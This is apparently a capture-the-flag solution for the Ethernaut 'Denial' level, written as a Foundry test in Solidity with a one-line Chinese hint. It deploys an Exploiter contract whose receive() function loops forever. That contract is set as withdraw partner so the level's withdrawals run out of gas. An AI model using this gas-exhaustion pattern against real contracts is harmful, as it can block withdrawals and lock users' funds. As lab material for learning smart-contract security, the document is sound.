在 receive 中死循环耗尽 gas 即可

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        Exploiter exploiter = new Exploiter();
        level.setWithdrawPartner(address(exploiter));

        vm.stopPrank();
    }
}

contract Exploiter {
    uint256 private sum;

    function withdraw(Denial level) external {
        level.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}
```

